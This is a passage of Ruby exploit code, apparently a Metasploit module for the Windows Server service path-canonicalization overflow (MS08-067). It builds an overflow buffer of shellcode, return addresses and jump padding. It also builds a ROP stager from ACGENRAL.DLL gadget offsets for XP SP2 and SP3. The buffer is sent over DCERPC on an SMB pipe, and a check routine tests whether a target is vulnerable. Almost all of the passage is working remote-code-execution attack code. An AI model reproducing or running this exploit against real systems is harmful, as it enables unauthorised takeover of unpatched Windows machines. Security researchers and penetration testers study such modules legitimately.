      jumper[ 0, 4] = [mytarget['RetDec']].pack('V') # one more to Align and make room

      jumper[ 4, 4] = [mytarget['RetDec']].pack('V') # 4 more for space
      jumper[ 8, 4] = [mytarget['RetDec']].pack('V')
      jumper[ 12, 4] = [mytarget['RetDec']].pack('V')
      jumper[ 16, 4] = [mytarget['RetDec']].pack('V')

      jumper[ 20, 4] = [mytarget['RetPop']].pack('V') # pop to EBP
      jumper[ 24, 4] = [mytarget['DisableNX']].pack('V')

      jumper[ 56, 4] = [mytarget['JmpESP']].pack('V')
      jumper[ 60, 4] = [mytarget['JmpESP']].pack('V')
      jumper[ 64, 2] = "\xeb\x02"                    # our jump
      jumper[ 68, 2] = "\xeb\x62"                    # original

      path =
        Rex::Text.to_unicode('\\') +

        # This buffer is removed from the front
        Rex::Text.rand_text_alpha(100) +

        # Shellcode
        payload.encoded +

        # Relative path to trigger the bug
        Rex::Text.to_unicode('\\..\\..\\') +

        # Extra padding
        Rex::Text.to_unicode(pad) +

        # Writable memory location (static)
        [mytarget['Scratch']].pack('V') + # EBP

        # Return to code which disables NX (or just the return)
        [mytarget['RetDec']].pack('V') +

        # Padding with embedded jump
        jumper +

        # NULL termination
        "\x00" * 2

    #
    # Windows XP SP2/SP3 ROP Stager targets
    #
    elsif mytarget['UseROP']

      rop = generate_rop(mytarget['UseROP'])

      path =
        Rex::Text.to_unicode('\\') +

        # This buffer is removed from the front
        Rex::Text.rand_text_alpha(100) +

        # Shellcode
        payload.encoded +

        # Relative path to trigger the bug
        Rex::Text.to_unicode('\\..\\..\\') +

        # Extra padding
        Rex::Text.to_unicode(pad) +

        # ROP Stager
        rop +

        # Padding (skipped)
        Rex::Text.rand_text_alpha(2) +

        # NULL termination
        "\x00" * 2

    #
    # Windows 2000, XP (NX), and 2003 (NO NX) targets
    #
    else

      jumper = Rex::Text.rand_text_alpha(70).upcase
      jumper[ 4, 4] = [mytarget.ret].pack('V')
      jumper[50, 8] = make_nops(8)
      jumper[58, 2] = "\xeb\x62"

      path =
        Rex::Text.to_unicode('\\') +

        # This buffer is removed from the front
        Rex::Text.rand_text_alpha(100) +

        # Shellcode
        payload.encoded +

        # Relative path to trigger the bug
        Rex::Text.to_unicode('\\..\\..\\') +

        # Extra padding
        Rex::Text.to_unicode(pad) +

        # Writable memory location (static)
        [mytarget['Scratch']].pack('V') + # EBP

        # Return to code which disables NX (or just the return)
        [mytarget['DisableNX'] || mytarget.ret].pack('V') +

        # Padding with embedded jump
        jumper +

        # NULL termination
        "\x00" * 2

    end

    handle = dcerpc_handle(
      '4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',
      'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
    )

    dcerpc_bind(handle)

    stub =
      NDR.uwstring(server) +
      NDR.UnicodeConformantVaryingStringPreBuilt(path) +
      NDR.long(rand(1024)) +
      NDR.wstring(prefix) +
      NDR.long(4097) +
      NDR.long(0)

    # NOTE: we don't bother waiting for a response here...
    print_status('Attempting to trigger the vulnerability...')
    dcerpc.call(0x1f, stub, false)

    # Cleanup
    handler
    disconnect
  end

  def check
    begin
      connect
      smb_login
    rescue Rex::ConnectionError => e
      vprint_error("Connection failed: #{e.class}: #{e}")
      return Msf::Exploit::CheckCode::Unknown
    rescue Rex::Proto::SMB::Exceptions::LoginError => e
      if e.message =~ /Connection reset/
        vprint_error('Connection reset during login')
        vprint_error('This most likely means a previous exploit attempt caused the service to crash')
        return Msf::Exploit::CheckCode::Unknown
      else
        raise e
      end
    end

    #
    # Build the malicious path name
    # 5b878ae7 "db @eax;g"
    prefix = '\\'
    path =
      "\x00\\\x00/" * 0x10 +
      Rex::Text.to_unicode('\\') +
      Rex::Text.to_unicode('R7') +
      Rex::Text.to_unicode('\\..\\..\\') +
      Rex::Text.to_unicode('R7') +
      "\x00" * 2

    server = Rex::Text.rand_text_alpha(rand(8) + 1).upcase

    handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',
                           'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
    )

    begin
      # Samba doesn't have this handle and returns an ErrorCode
      dcerpc_bind(handle)
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      vprint_error("SMB error: #{e.message}")
      return Msf::Exploit::CheckCode::Safe
    end

    vprint_status('Verifying vulnerable status... (path: 0x%08x)' % path.length)

    stub =
      NDR.uwstring(server) +
      NDR.UnicodeConformantVaryingStringPreBuilt(path) +
      NDR.long(8) +
      NDR.wstring(prefix) +
      NDR.long(4097) +
      NDR.long(0)

    resp = dcerpc.call(0x1f, stub)
    error = resp[4, 4].unpack('V')[0]

    # Cleanup
    simple.client.close
    simple.client.tree_disconnect
    disconnect

    if (error == 0x0052005c) # \R :)
      return Msf::Exploit::CheckCode::Vulnerable
    else
      vprint_error('System is not vulnerable (status: 0x%08x)' % error) if error
      return Msf::Exploit::CheckCode::Safe
    end
  end

  def generate_rop(version)
    free_byte = "\x90"
    # free_byte = "\xcc"

    # create a few small gadgets
    #  <free byte>; pop edx; pop ecx; ret
    gadget1 = free_byte + "\x5a\x59\xc3"
    #  mov edi, eax; add edi,0xc; push 0x40; pop ecx; rep movsd
    gadget2 = free_byte + "\x89\xc7" + "\x83\xc7\x0c" + "\x6a\x7f" + "\x59" + "\xf2\xa5" + free_byte
    #  <must complete \x00 two byte opcode>; <free_byte>; jmp $+0x5c
    gadget3 = "\xcc" + free_byte + "\xeb\x5a"

    # gadget2:
    #  get eax into edi
    #  adjust edi
    #  get 0x7f in ecx
    #  copy the data
    #  jmp to it
    #
    dws = gadget2.unpack('V*')

    ##
    # Create the ROP stager, pfew.. Props to corelanc0d3r!
    # This was no easy task due to space limitations :-/
    # -jduck
    ##
    module_name = 'ACGENRAL.DLL'
    module_base = 0x6f880000

    rvasets = {}
    # XP SP2
    rvasets['5.1.2600.2180'] = {
      # call [imp_HeapCreate] / mov [0x6f8b8024], eax / ret
      'call_HeapCreate'                          => 0x21064,
      'add eax, ebp / mov ecx, 0x59ffffa8 / ret' => 0x2e546,
      'pop ecx / ret'                            => 0x2e546 + 6,
      'mov [eax], ecx / ret'                     => 0xd182,
      'jmp eax'                                  => 0x19b85,
      'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret' => 0x10976,
      'mov [eax+0x10], ecx / ret'                => 0x10976 + 6,
      'add eax, 8 / ret'                         => 0x29a14
    }

    # XP SP3
    rvasets['5.1.2600.5512'] = {
      # call [imp_HeapCreate] / mov [0x6f8b02c], eax / ret
      'call_HeapCreate'                          => 0x21286,
      'add eax, ebp / mov ecx, 0x59ffffa8 / ret' => 0x2e796,
      'pop ecx / ret'                            => 0x2e796 + 6,
      'mov [eax], ecx / ret'                     => 0xd296,
      'jmp eax'                                  => 0x19c6f,
      'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret' => 0x10a56,
      'mov [eax+0x10], ecx / ret'                => 0x10a56 + 6,
      'add eax, 8 / ret'                         => 0x29c64
    }

    # HeapCreate ROP Stager from ACGENRAL.DLL 5.1.2600.2180
    rop = [
      # prime ebp (adjustment distance)
      0x00018000,

      # get some RWX memory via HeapCreate
      'call_HeapCreate',
      0x01040110, # flOptions (gets & with 0x40005)
      0x01010101,
      0x01010101,

      # adjust the returned pointer
      'add eax, ebp / mov ecx, 0x59ffffa8 / ret',

      # setup gadget1
      'pop ecx / ret',
      gadget1.unpack('V').first,
      'mov [eax], ecx / ret',

      # execute gadget1
      'jmp eax',

      # setup gadget2 (via gadget1)
      dws[0],
      dws[1],
      'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret',

      # setup part3 of gadget2
      'pop ecx / ret',
      dws[2],
      'mov [eax+0x10], ecx / ret',

      # execute gadget2
      'add eax, 8 / ret',
      'jmp eax',

      # gadget3 gets executed after gadget2 (luckily)
      gadget3.unpack('V').first
    ]

    # convert the meta rop into concrete bytes
    rvas = rvasets[version]

    rop.map! { |e|
      if e.kind_of? String
        # Meta-replace (RVA)
        fail_with(Failure::BadConfig, "Unable to locate key: \"#{e}\"") unless rvas[e]
        module_base + rvas[e]

      elsif e == :unused
        # Randomize
        rand_text(4).unpack('V').first

      else
        # Literal
        e
      end
    }

    ret = rop.pack('V*')

    # check badchars?
    # idx = Rex::Text.badchar_index(ret, payload_badchars)

    ret
  end
end
